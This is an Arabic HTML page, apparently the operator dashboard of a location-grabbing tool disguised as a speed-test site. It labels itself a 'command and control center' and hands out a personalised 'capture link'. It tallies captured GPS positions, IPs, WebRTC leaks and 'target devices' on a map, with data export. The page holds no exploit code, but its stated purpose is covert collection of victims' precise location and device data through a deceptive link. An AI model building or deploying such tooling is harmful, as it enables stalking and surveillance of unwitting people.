<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة التحكم — منصة تشخيص الشبكة</title>
  <meta name="description" content="مركز القيادة والتحكم لمراقبة عمليات فحص الشبكة وتتبع المواقع الجغرافية.">
  <meta name="theme-color" content="#0b1110">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='18' fill='%230b1110'/%3E%3Ccircle cx='50' cy='50' r='25' fill='%2395f0c0'/%3E%3C/svg%3E">
</head>
<body>
  <div class="dashboard-shell">
    <!-- ═══ SIDEBAR ═══ -->
    <aside class="sidebar" aria-label="لوحة التحكم">
      <header class="sidebar-header">
        <a class="brand" href="/" target="_blank" rel="noreferrer">
          <span class="brand-dot" aria-hidden="true"></span>
          <span>
            <strong>مقياس السرعة</strong>
            <small>مركز القيادة والتحكم</small>
          </span>
        </a>
        <span class="live-badge" id="liveBadge">مباشر</span>
        <button class="icon-btn" onclick="window.location.href='/api/logout'" title="خروج">
          <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
        </button>
      </header>

      <!-- Stats -->
      <section class="stats-row">
        <article class="stat-card">
          <strong id="totalCaptures">0</strong>
          <span>إجمالي الالتقاط</span>
        </article>
        <article class="stat-card">
          <strong id="gpsCount">0</strong>
          <span>مواقع GPS</span>
        </article>
        <article class="stat-card">
          <strong id="deviceCount">0</strong>
          <span>أجهزة فريدة</span>
        </article>
      </section>

      <!-- Capture Link -->
      <section class="link-display" id="linkDisplay">
        <div class="link-label">رابط الالتقاط المخصص</div>
        <div class="link-input-group">
          <input id="personalLinkInput" readonly value="جاري التوليد...">
          <button class="icon-btn copy-link-btn" onclick="copyPersonalLink()" title="نسخ الرابط">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
          </button>
        </div>
      </section>

      <!-- Controls -->
      <section class="controls-stack">
        <div class="search-field">
          <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
          <input id="searchInput" type="search" placeholder="بحث بالهوية، IP، المدينة، أو الجهاز">
        </div>
        <div class="control-grid">
          <label>
            <span>الفلترة</span>
            <select id="layerFilter">
              <option value="all">الكل</option>
              <option value="gps">GPS فقط</option>
              <option value="ip">IP فقط</option>
              <option value="webrtc">تسريب WebRTC</option>
              <option value="nogps">بدون موقع</option>
            </select>
          </label>
          <label>
            <span>الترتيب</span>
            <select id="sortSelect">
              <option value="newest">الأحدث أولاً</option>
              <option value="oldest">الأقدم أولاً</option>
              <option value="gps-accuracy">دقة GPS</option>
              <option value="visits">عدد الزيارات</option>
            </select>
          </label>
        </div>
      </section>

      <!-- View Toggle -->
      <section class="view-toggle">
        <button class="toggle-btn active" type="button" data-view="devices">أجهزة الأهداف</button>
        <button class="toggle-btn" type="button" data-view="all">قائمة العمليات</button>
      </section>

      <!-- List -->
      <section class="list-area" id="listArea"></section>

      <!-- Footer -->
      <footer class="sidebar-footer">
        <button class="foot-btn" data-action="toggle-live" title="إيقاف/تشغيل البث">
          <svg viewBox="0 0 24 24"><path d="M6 4v16M18 4v16"/></svg>
        </button>
        <button class="foot-btn" data-action="refresh" title="تحديث">
          <svg viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
        </button>
        <button class="foot-btn" data-action="fit-map" title="ملاءمة الخريطة">
          <svg viewBox="0 0 24 24"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
        </button>
        <button class="foot-btn" data-action="export-json" title="تصدير JSON">
          <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
        </button>
        <button class="foot-btn" data-action="export-csv" title="تصدير CSV">
          <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M3 15h18M9 3v18"/></svg>
        </button>
        <button class="foot-btn danger" data-action="clear-all" title="مسح الكل">
          <svg viewBox="0 0 24 24"><path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
        </button>
      </footer>
    </aside>

    <!-- ═══ MAIN AREA ═══ -->
    <main class="main-grid">
      <section class="map-panel">
        <div id="map"></div>
        <!-- Map Overlay -->
        <div id="mapOverlay" class="map-overlay">
          <div class="empty-state">
            <svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 1 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
            <strong>مركز القيادة والتحكم</strong>
            <span>بانتظار وصول بيانات حية من العقد النشطة</span>
          </div>
        </div>
        <!-- Map Tools -->
        <div class="map-tools">
          <button data-action="fit-map">
            <svg viewBox="0 0 24 24"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
            ملاءمة
          </button>
          <button data-action="latest">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
            الأحدث
          </button>
        </div>
        <!-- Map Legend -->
        <div class="map-legend">
          <span><i class="legend-dot gps"></i>GPS</span>
          <span><i class="legend-dot ip"></i>IP</span>
          <span><i class="legend-dot selected"></i>محدد</span>
        </div>
      </section>

      <!-- Detail Panel -->
      <section class="detail-panel">
        <div id="detailEmpty" class="detail-empty">
          <div>
            <svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 1 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
            <strong>اختر عملية من القائمة</strong>
            <span>سيتم عرض تفاصيل الهدف ومعلوماته الكاملة هنا</span>
          </div>
        </div>
        <div id="detailContent" class="detail-content hidden">
          <div class="detail-top">
            <div>
              <span class="detail-label">معرف العملية</span>
              <h1 id="detailId"></h1>
              <span class="detail-device-badge" id="detailDeviceBadge"></span>
            </div>
            <div class="detail-actions">
              <button class="icon-btn" data-action="copy-selected" title="نسخ التفاصيل">
                <svg viewBox="0 0 24 24"><rect x="8" y="4" width="8" height="4" rx="1"/><path d="M16 6h2a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h2"/></svg>
              </button>
              <button class="icon-btn danger" data-action="delete-selected" title="حذف العملية">
                <svg viewBox="0 0 24 24"><path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
              </button>
            </div>
          </div>
          <time class="detail-time" id="detailTime"></time>
          <div class="layer-status" id="layerStatus"></div>
          <div id="detailSections"></div>
        </div>
      </section>
    </main>
  </div>

  <!-- Confirm Modal -->
  <div id="confirmBackdrop" class="confirm-backdrop hidden"></div>
  <div id="confirmModal" class="confirm-modal hidden">
    <strong id="confirmTitle"></strong>
    <p id="confirmText"></p>
    <div class="confirm-actions">
      <button class="modal-btn" data-action="cancel-confirm">إلغاء</button>
      <button class="modal-btn danger" data-action="confirm-action">تأكيد</button>
    </div>
  </div>

  <!-- Toast -->
  <div id="toast" class="toast"></div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="script.js"></script>
</body>
</html>
